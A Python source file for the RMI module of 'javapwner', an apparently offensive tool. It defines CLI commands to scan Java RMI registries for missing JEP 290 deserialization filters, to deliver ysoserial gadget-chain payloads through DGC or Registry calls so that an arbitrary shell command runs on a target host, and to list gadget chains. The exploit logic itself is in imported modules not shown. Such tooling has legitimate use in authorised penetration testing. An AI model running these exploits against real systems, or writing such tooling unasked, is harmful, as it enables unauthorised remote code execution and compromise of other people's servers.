"""Click sub-commands for the Java RMI module.

Commands:
  javapwner rmi scan    -t HOST [-p PORT]     ← Registry enumeration + JEP 290 probe
  javapwner rmi exploit -t HOST -p PORT --gadget NAME --cmd CMD
  javapwner rmi gadgets
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.rmi.scanner import RmiScanner
from javapwner.protocols.rmi.exploiter import RmiExploiter

DEFAULT_PORT = 1099


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def rmi() -> None:
    """Java RMI / JMX protocol commands."""


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------

@rmi.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the RMI endpoint.")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Enumerate a Java RMI Registry and probe for JEP 290 filters.

    \b
    Steps performed:
      1. JRMP handshake — confirm the endpoint speaks Java RMI
      2. Registry list() — retrieve all bound names
      3. DGC JEP 290 probe — test deserialization filter state (no ysoserial needed)

    \b
    Examples:
      javapwner rmi scan -t 10.0.0.5
      javapwner rmi scan -t 10.0.0.5 -p 8282
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    scanner = RmiScanner(timeout=timeout)

    with fmt.status(f"Scanning {target}:{port}…"):
        try:
            result = scanner.scan(target, port)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    if result.is_jrmp:
        fmt.success("JRMP endpoint confirmed")
        if result.jrmp_version:
            fmt.info(f"  Protocol version : {result.jrmp_version}")
        if result.jrmp_host:
            fmt.info(f"  Server hostname  : {result.jrmp_host}")
        if result.jrmp_port:
            fmt.info(f"  Server port      : {result.jrmp_port}")
    else:
        fmt.warning("Port is open but JRMP was not confirmed.")

    fmt.section("RMI Registry")
    if result.is_registry:
        fmt.success(f"Registry confirmed — {len(result.bound_names)} bound name(s)")
        for name in result.bound_names:
            fmt.info(f"  {name}")
    else:
        fmt.info("No Registry response (may be JMX-only or non-registry JRMP).")

    fmt.section("DGC / JEP 290")
    d = result.to_dict()
    jep290_str = d.get("dgc_jep290", "unknown")
    if result.jep290_active is False:
        fmt.success(f"DGC JEP 290 : {jep290_str}")
        fmt.warning(
            "DGC deserialization appears UNFILTERED. "
            "Run 'javapwner rmi exploit' to test RCE."
        )
    elif result.jep290_active is True:
        fmt.warning(f"DGC JEP 290 : {jep290_str}")
    elif result.dgc_reachable:
        fmt.info(f"DGC JEP 290 : {jep290_str}")
    else:
        fmt.info("DGC JEP 290 : unreachable")


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@rmi.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--via", type=click.Choice(["dgc", "registry"]),
              default="dgc", show_default=True,
              help="Delivery vector: 'dgc' (always available) or 'registry' (restricted since JDK 8u141).")
@click.pass_context
def exploit_cmd(
    ctx: click.Context,
    target: str,
    port: int,
    gadget: str,
    command: str,
    via: str,
) -> None:
    """Deliver a ysoserial payload to a Java RMI endpoint.

    \b
    Delivery vectors:
      --via dgc       DGC dirty() call — works on any JRMP endpoint (default)
      --via registry  Registry bind() — requires unauthenticated bind access

    \b
    Examples:
      javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'
      javapwner rmi exploit -t 10.0.0.5 -p 8282 --gadget Spring1 --cmd 'id' --via dgc
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        exploiter = RmiExploiter(timeout=timeout, jar_path=jar)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    fmt.info(f"Exploiting {target}:{port} via {via} with gadget '{gadget}' → {command!r}")

    try:
        result = exploiter.exploit(target, port, gadget, command, via=via)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — no exception in response (likely executed).")
    elif result.exception_in_response:
        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP 290?).")
    elif result.sent:
        fmt.info("Payload sent — no response received (blind execution).")
    else:
        fmt.error("Payload was not sent.")

    if fmt.verbose:
        fmt.print_hex_dump(result.response_bytes, label="Server response")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

@rmi.command("gadgets")
@click.pass_context
def gadgets_cmd(ctx: click.Context) -> None:
    """List available ysoserial gadget chains."""
    fmt = _get_fmt(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        gadgets = wrapper.list_gadgets()
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({"gadgets": gadgets})
        return

    if not gadgets:
        fmt.warning("No gadgets found — check ysoserial.jar version.")
        return

    fmt.success(f"Available gadgets ({len(gadgets)}):")
    for g in gadgets:
        fmt.info(f"  {g}")
